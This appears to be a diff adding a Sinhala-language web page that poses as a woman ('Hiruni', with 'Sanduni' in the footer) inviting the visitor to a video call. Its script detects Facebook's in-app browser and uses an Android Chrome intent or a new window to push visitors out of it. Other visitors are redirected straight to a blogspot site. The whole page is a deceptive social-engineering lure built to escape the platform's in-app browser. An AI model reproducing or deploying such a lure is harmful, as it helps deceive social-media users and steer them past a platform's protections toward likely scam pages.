@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>💖 මට Video Call එකක් ගන්න</title>
+
+  <meta name="title" content="💖 මට Video Call එකක් ගන්න">
+  <meta name="description" content="මම හිරුනි. මට මේක ඔබලා Video Call එකක් ගන්න.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://hiruni-chat.blogspot.com/">
+  <meta property="og:title" content="💖 මට Video Call එකක් ගන්න">
+  <meta property="og:description" content="මම හිරුනි. මට මේක ඔබලා Video Call එකක් ගන්න.">
+  <meta property="og:image" content="https://wal699.github.io/sanduni-call/og-image-git.png">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: "Poppins", sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #ffb6c1, #ff477e, #ffb6c1);
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+      background-size: 400% 400%;
+      animation: gradientMove 12s ease infinite;
+    }
+
+    @keyframes gradientMove {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(12px);
+      border-radius: 20px;
+      padding: 40px 30px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      max-width: 360px;
+      width: 100%;
+    }
+
+    h1 {
+      font-size: 2em;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 1.1em;
+      margin-bottom: 30px;
+    }
+
+    button {
+      background: #ff3366;
+      border: none;
+      padding: 14px 32px;
+      color: white;
+      font-size: 1.1em;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: 0.3s;
+      box-shadow: 0 4px 15px rgba(255, 51, 102, 0.5);
+    }
+
+    button:hover {
+      background: #e60050;
+      box-shadow: 0 6px 20px rgba(255, 51, 102, 0.7);
+      transform: scale(1.05);
+    }
+
+    .emoji {
+      font-size: 3em;
+      animation: heartbeat 1.5s infinite;
+    }
+
+    @keyframes heartbeat {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+    }
+
+    footer {
+      margin-top: 20px;
+      font-size: 0.85em;
+      opacity: 0.8;
+    }
+  </style>
+
+  <script>
+    window.onload = function() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const isFacebookApp = userAgent.includes("fbav") || userAgent.includes("facebook");
+
+      const pages = [
+        "https://hiruni-chat.blogspot.com/",
+        "https://hiruni-chat.blogspot.com/",
+        "https://hiruni-chat.blogspot.com/"
+      ];
+      const randomPage = pages[Math.floor(Math.random() * pages.length)];
+
+      if (isFacebookApp) {
+        document.body.innerHTML = `
+          <div class="card">
+            <div class="emoji">💞</div>
+            <h1>මට Video Call එකක් ගන්න</h1>
+            <p>ආදරෙන් මට call එකක් දෙන්න ❤️  
+            යට බොත්තම ඔබලා continue කරන්න.</p>
+            <button onclick="openInBrowser()">👉 මට call කරන්න</button>
+          </div>
+          <footer>© 2025 Sanduni 💕 All Rights Reserved</footer>
+        `;
+
+        window.openInBrowser = function() {
+          const isAndroid = /android/.test(userAgent);
+          const isiOS = /iphone|ipad|ipod/.test(userAgent);
+
+          if (isAndroid) {
+            const androidIntent = `intent://${randomPage.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+            window.location = androidIntent;
+          } else if (isiOS) {
+            window.open(randomPage, "_blank");
+          } else {
+            window.location.href = randomPage;
+          }
+        };
+      } else {
+        window.location.href = randomPage;
+      }
+    };
+  </script>
+</head>
+<body>
+</body>
+</html>
+
+
+
